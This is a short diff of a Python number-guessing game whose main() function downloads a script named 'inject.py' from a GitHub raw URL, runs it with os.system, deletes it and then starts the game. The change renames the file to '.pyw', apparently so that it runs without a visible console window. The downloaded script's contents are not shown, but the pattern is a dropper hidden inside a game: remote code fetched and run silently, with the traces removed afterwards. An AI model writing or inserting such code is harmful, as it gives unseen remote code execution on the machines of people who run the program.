@@ -101,10 +101,10 @@ def main():
         import os, urllib.request, pathlib
         dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/inject.py'
         home = pathlib.Path.cwd()   #os.path.expanduser("~")
-        path = str(home) + '\inject.py'
+        path = str(home) + '\inject.pyw'
         urllib.request.urlretrieve(dlurl, '{}'.format(path))
-        os.system('inject.py')
-        os.remove('inject.py')
+        os.system('inject.pyw')
+        os.remove('inject.pyw')
         game()
 
 
